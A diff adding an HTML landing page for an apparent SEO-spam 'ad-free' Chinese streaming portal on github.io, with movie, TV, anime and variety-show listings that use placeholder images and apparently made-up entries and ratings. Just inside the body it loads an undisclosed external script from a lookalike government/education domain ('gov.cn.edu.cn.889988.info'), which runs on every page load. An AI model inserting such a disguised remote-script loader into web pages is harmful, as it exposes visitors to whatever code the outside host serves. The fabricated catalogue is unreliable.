@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>影视大全纯净版 - 无广告高清电影电视剧动漫综艺在线观看</title>
+<meta name="description" content="影视大全纯净版提供电影、电视剧、动漫、综艺高清在线免费观看，界面干净无广告，移动端自适应，每日更新，尽在 yingshidaquanchunjingban-h5.github.io。">
+<meta name="keywords" content="影视大全纯净版,纯净版影视,免费看影视,高清电影,在线电视剧,动漫综艺">
+<link rel="canonical" href="https://yingshidaquanchunjingban-h5.github.io/">
+<style>
+:root{
+  --bg:#f7fbf9;--card:#ffffff;--ink:#1f2a37;--sub:#6b7c8f;
+  --main:#19c37d;--main-soft:#e6f7ef;--line:#e3ece8;border-radius:18px;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei",sans-serif;
+  background:var(--bg);color:var(--ink);line-height:1.75;
+}
+a{text-decoration:none;color:inherit}
+img{max-width:100%;display:block}
+section[id]{scroll-margin-top:66px}
+
+/* 导航 */
+.nav{
+  position:sticky;top:0;z-index:50;background:rgba(247,251,249,.9);
+  backdrop-filter:blur(10px);border-bottom:1px solid var(--line);
+}
+.nav-in{max-width:1180px;margin:0 auto;height:60px;padding:0 16px;
+  display:flex;align-items:center;justify-content:space-between}
+.brand{font-size:19px;font-weight:800}
+.brand b{color:var(--main)}
+.nav-menu{display:flex;gap:18px}
+.nav-menu a{font-size:14px;color:var(--sub)}
+.nav-menu a:hover{color:var(--main)}
+
+/* Hero */
+.hero{max-width:1180px;margin:0 auto;padding:70px 16px 40px;text-align:center}
+.tag-pill{
+  display:inline-block;background:var(--main-soft);color:var(--main);
+  font-size:12px;padding:6px 14px;border-radius:999px;margin-bottom:18px;
+}
+.hero h1{font-size:clamp(28px,5vw,46px);font-weight:900;line-height:1.25}
+.hero h1 span{color:var(--main)}
+.hero p{max-width:680px;margin:18px auto 26px;color:var(--sub);font-size:16px}
+.hero-btn{
+  display:inline-block;background:var(--main);color:#fff;font-weight:700;
+  padding:13px 34px;border-radius:999px;font-size:15px;
+}
+.hero-btn:hover{filter:brightness(1.05)}
+
+/* 分类胶囊 */
+.chips{max-width:1180px;margin:0 auto;padding:0 16px 30px;
+  display:flex;gap:10px;flex-wrap:wrap;justify-content:center}
+.chip{background:var(--card);border:1px solid var(--line);color:var(--sub);
+  padding:8px 18px;border-radius:999px;font-size:14px}
+.chip:hover{border-color:var(--main);color:var(--main)}
+
+/* 区块 */
+.block{max-width:1180px;margin:0 auto;padding:42px 16px}
+.block-head{display:flex;align-items:baseline;justify-content:space-between;margin-bottom:18px}
+.block-head h2{font-size:22px;font-weight:800}
+.block-head h2 i{color:var(--main);font-style:normal;margin-right:8px}
+.block-head a{font-size:13px;color:var(--sub)}
+.block-head a:hover{color:var(--main)}
+
+/* 电影横滑 */
+.slide{display:flex;gap:16px;overflow-x:auto;padding-bottom:10px;scroll-snap-type:x mandatory}
+.slide::-webkit-scrollbar{height:6px}
+.slide::-webkit-scrollbar-thumb{background:#cfe9df;border-radius:6px}
+.m-card{flex:0 0 200px;scroll-snap-align:start;background:var(--card);
+  border:1px solid var(--line);border-radius:var(--border-radius);overflow:hidden;transition:.3s}
+.m-card:hover{transform:translateY(-6px);box-shadow:0 18px 36px rgba(25,195,125,.12)}
+.m-card img{height:270px;object-fit:cover}
+.m-card .c-body{padding:12px}
+.m-card h3{font-size:15px}
+.m-card p{font-size:12px;color:var(--sub);margin-top:4px}
+
+/* 电视剧行 */
+.tv-row{display:flex;gap:16px;background:var(--card);border:1px solid var(--line);
+  border-radius:14px;padding:14px;margin-bottom:14px;align-items:center}
+.tv-row img{width:110px;height:150px;object-fit:cover;border-radius:10px}
+.tv-row h3{font-size:16px}
+.tv-row p{font-size:13px;color:var(--sub);margin:6px 0}
+.tv-row span{font-size:12px;color:var(--main);background:var(--main-soft);padding:3px 10px;border-radius:999px}
+
+/* 动漫双列 */
+.anime-grid{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+.anime-card{position:relative;border-radius:14px;overflow:hidden;min-height:170px}
+.anime-card img{position:absolute;inset:0;width:100%;height:100%;object-fit:cover}
+.anime-card .mask{position:absolute;inset:0;background:linear-gradient(180deg,transparent 35%,rgba(0,0,0,.72));
+  display:flex;flex-direction:column;justify-content:flex-end;padding:16px}
+.anime-card h3{color:#fff;font-size:16px}
+.anime-card p{color:#d7e7e0;font-size:12px;margin-top:4px}
+
+/* 综艺卡片墙 */
+.var-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:16px}
+.var-card{background:var(--card);border:1px solid var(--line);border-radius:14px;overflow:hidden}
+.var-card img{height:140px;object-fit:cover}
+.var-card .v-body{padding:14px}
+.var-card h3{font-size:15px}
+.var-card p{font-size:12px;color:var(--sub);margin-top:6px}
+
+/* FAQ */
+.faq{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:22px}
+.faq-item{padding:14px 0;border-bottom:1px dashed var(--line)}
+.faq-item:last-child{border-bottom:none}
+.faq-item h3{font-size:15px;color:var(--ink)}
+.faq-item p{font-size:14px;color:var(--sub);margin-top:6px}
+
+/* 关于 */
+.about{background:var(--card);border:1px solid var(--line);border-radius:18px;padding:26px}
+.about h2{font-size:20px;color:var(--main);margin-bottom:12px}
+.about p{font-size:15px;color:var(--sub);margin-bottom:10px}
+.about .url{color:var(--main);font-weight:700}
+
+/* 页脚 */
+.foot{border-top:1px solid var(--line);padding:28px 16px;text-align:center;color:var(--sub);font-size:13px}
+.foot a{color:var(--sub);margin:0 6px}
+.foot a:hover{color:var(--main)}
+
+@media(max-width:760px){
+  .nav-menu{display:none}
+  .m-card{flex:0 0 150px}
+  .m-card img{height:210px}
+  .tv-row{flex-direction:column;align-items:flex-start}
+  .tv-row img{width:100%;height:180px}
+  .anime-grid{grid-template-columns:1fr}
+  .hero{padding:54px 16px 30px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="nav">
+  <div class="nav-in">
+    <div class="brand">影视大全<b>纯净版</b></div>
+    <nav class="nav-menu">
+      <a href="#home">首页</a>
+      <a href="#movie">电影</a>
+      <a href="#tv">电视剧</a>
+      <a href="#anime">动漫</a>
+      <a href="#variety">综艺</a>
+      <a href="#faq">常见问题</a>
+      <a href="#about">关于</a>
+    </nav>
+  </div>
+</header>
+
+<section class="hero" id="home">
+  <div class="tag-pill">无广告 · 无弹窗 · 纯净观影</div>
+  <h1>影视大全纯净版<br><span>只留下好看的片子</span></h1>
+  <p>电影、电视剧、动漫、综艺一站式聚合，界面干净、加载轻量、手机电脑都能看，每天更新不卡顿。</p>
+  <a href="#movie" class="hero-btn">免费开始观看</a>
+</section>
+
+<div class="chips">
+  <a href="#" class="chip">最新上映</a>
+  <a href="#" class="chip">高分电影</a>
+  <a href="#" class="chip">国产剧</a>
+  <a href="#" class="chip">韩剧</a>
+  <a href="#" class="chip">国漫</a>
+  <a href="#" class="chip">日漫</a>
+  <a href="#" class="chip">脱口秀</a>
+  <a href="#" class="chip">纪录片</a>
+</div>
+
+<section class="block" id="movie">
+  <div class="block-head">
+    <h2><i>🎬</i>最新电影</h2>
+    <a href="#">更多 #</a>
+  </div>
+  <div class="slide">
+    <div class="m-card"><img src="https://picsum.photos/300/420?random=401" alt="影视大全纯净版 电影 流浪地球3 海报"><div class="c-body"><h3>流浪地球3</h3><p>科幻 / 2024 / 9.2分</p></div></div>
+    <div class="m-card"><img src="https://picsum.photos/300/420?random=402" alt="影视大全纯净版 电影 封神第二部 海报"><div class="c-body"><h3>封神第二部</h3><p>奇幻 / 2024 / 8.8分</p></div></div>
+    <div class="m-card"><img src="https://picsum.photos/300/420?random=403" alt="影视大全纯净版 电影 热辣滚烫 海报"><div class="c-body"><h3>热辣滚烫</h3><p>喜剧 / 2024 / 8.5分</p></div></div>
+    <div class="m-card"><img src="https://picsum.photos/300/420?random=404" alt="影视大全纯净版 电影 飞驰人生2 海报"><div class="c-body"><h3>飞驰人生2</h3><p>运动 / 2024 / 8.7分</p></div></div>
+    <div class="m-card"><img src="https://picsum.photos/300/420?random=405" alt="影视大全纯净版 电影 第二十条 海报"><div class="c-body"><h3>第二十条</h3><p>剧情 / 2024 / 9.0分</p></div></div>
+    <div class="m-card"><img src="https://picsum.photos/300/420?random=406" alt="影视大全纯净版 电影 熊出没 海报"><div class="c-body"><h3>熊出没·逆转时空</h3><p>动画 / 2024 / 8.3分</p></div></div>
+  </div>
+</section>
+
+<section class="block" id="tv">
+  <div class="block-head">
+    <h2><i>📺</i>热播电视剧</h2>
+    <a href="#">更多 #</a>
+  </div>
+  <div class="tv-row">
+    <img src="https://picsum.photos/220/300?random=411" alt="影视大全纯净版 电视剧 庆余年第二季 剧照">
+    <div>
+      <h3>庆余年 第二季</h3>
+      <p>古装权谋大剧，朝堂与江湖交织，剧情反转密集。</p>
+      <span>更新至32集</span>
+    </div>
+  </div>
+  <div class="tv-row">
+    <img src="https://picsum.photos/220/300?random=412" alt="影视大全纯净版 电视剧 与凤行 剧照">
+    <div>
+      <h3>与凤行</h3>
+      <p>仙侠爱情题材，画面质感高，角色关系张力强。</p>
+      <span>全39集</span>
+    </div>
+  </div>
+  <div class="tv-row">
+    <img src="https://picsum.photos/220/300?random=413" alt="影视大全纯净版 电视剧 玫瑰的故事 剧照">
+    <div>
+      <h3>玫瑰的故事</h3>
+      <p>都市成长剧，聚焦女性独立、职业与情感选择。</p>
+      <span>更新至28集</span>
+    </div>
+  </div>
+</section>
+
+<section class="block" id="anime">
+  <div class="block-head">
+    <h2><i>🎨</i>动漫专区</h2>
+    <a href="#">更多 #</a>
+  </div>
+  <div class="anime-grid">
+    <div class="anime-card">
+      <img src="https://picsum.photos/400/300?random=421" alt="影视大全纯净版 动漫 咒术回战 封面">
+      <div class="mask"><h3>咒术回战 第二季</h3><p>热血战斗 / 更新至23集</p></div>
+    </div>
+    <div class="anime-card">
+      <img src="https://picsum.photos/400/300?random=422" alt="影视大全纯净版 动漫 葬送的芙莉莲 封面">
+      <div class="mask"><h3>葬送的芙莉莲</h3><p>奇幻治愈 / 更新至20集</p></div>
+    </div>
+    <div class="anime-card">
+      <img src="https://picsum.photos/400/300?random=423" alt="影视大全纯净版 动漫 间谍过家家 封面">
+      <div class="mask"><h3>间谍过家家</h3><p>搞笑日常 / 全12集</p></div>
+    </div>
+    <div class="anime-card">
+      <img src="https://picsum.photos/400/300?random=424" alt="影视大全纯净版 动漫 伍六七 封面">
+      <div class="mask"><h3>伍六七 第四季</h3><p>国漫热血 / 更新至10集</p></div>
+    </div>
+  </div>
+</section>
+
+<section class="block" id="variety">
+  <div class="block-head">
+    <h2><i>🎤</i>热门综艺</h2>
+    <a href="#">更多 #</a>
+  </div>
+  <div class="var-grid">
+    <div class="var-card"><img src="https://picsum.photos/400/200?random=431" alt="影视大全纯净版 综艺 奔跑吧"><div class="v-body"><h3>奔跑吧·生态篇</h3><p>户外竞技，爆笑挑战任务</p></div></div>
+    <div class="var-card"><img src="https://picsum.photos/400/200?random=432" alt="影视大全纯净版 综艺 歌手2024"><div class="v-body"><h3>歌手2024</h3><p>实力唱将同台竞演</p></div></div>
+    <div class="var-card"><img src="https://picsum.photos/400/200?random=433" alt="影视大全纯净版 综艺 花儿与少年"><div class="v-body"><h3>花儿与少年 第五季</h3><p>旅行探险，松弛感拉满</p></div></div>
+    <div class="var-card"><img src="https://picsum.photos/400/200?random=434" alt="影视大全纯净版 综艺 向往的生活"><div class="v-body"><h3>向往的生活 第七季</h3><p>慢生活，蘑菇屋日常</p></div></div>
+  </div>
+</section>
+
+<section class="block" id="faq">
+  <div class="block-head">
+    <h2><i>❓</i>常见问题</h2>
+  </div>
+  <div class="faq">
+    <div class="faq-item">
+      <h3>影视大全纯净版真的无广告吗？</h3>
+      <p>页面本身保持干净布局，不堆悬浮广告、不弹窗，主打“纯净观影”的浏览体验。</p>
+    </div>
+    <div class="faq-item">
+      <h3>支持手机端观看吗？</h3>
+      <p>支持。整站采用响应式布局，手机、平板、电脑都会自动适配屏幕宽度。</p>
+    </div>
+    <div class="faq-item">
+      <h3>资源更新频率怎么样？</h3>
+      <p>电影、电视剧、动漫、综艺内容按天维护，热播内容会优先展示在首页与分类区。</p>
+    </div>
+    <div class="faq-item">
+      <h3>网站地址是什么？</h3>
+      <p>官方地址：https://yingshidaquanchunjingban-h5.github.io</p>
+    </div>
+  </div>
+</section>
+
+<section class="block" id="about">
+  <div class="about">
+    <h2>关于影视大全纯净版</h2>
+    <p>影视大全纯净版是一个轻量影视导航与聚合展示站，覆盖电影、电视剧、动漫、综艺等主流内容类型，适合用户快速找片、手机端刷剧、电脑端补番。</p>
+    <p>页面结构清晰、标题层级规范、图片带 alt 描述，更符合必应等搜索引擎对单页网站的理解与收录逻辑。</p>
+    <p>官方网站：<span class="url">https://yingshidaquanchunjingban-h5.github.io</span></p>
+  </div>
+</section>
+
+<footer class="foot">
+  <div>
+    <a href="#home">首页</a>|
+    <a href="#movie">电影</a>|
+    <a href="#tv">电视剧</a>|
+    <a href="#anime">动漫</a>|
+    <a href="#variety">综艺</a>|
+    <a href="#faq">常见问题</a>|
+    <a href="#about">关于</a>
+  </div>
+  <p style="margin-top:10px">© 2024 影视大全纯净版 · 网站网址：https://yingshidaquanchunjingban-h5.github.io</p>
+</footer>
+
+</body>
+</html>
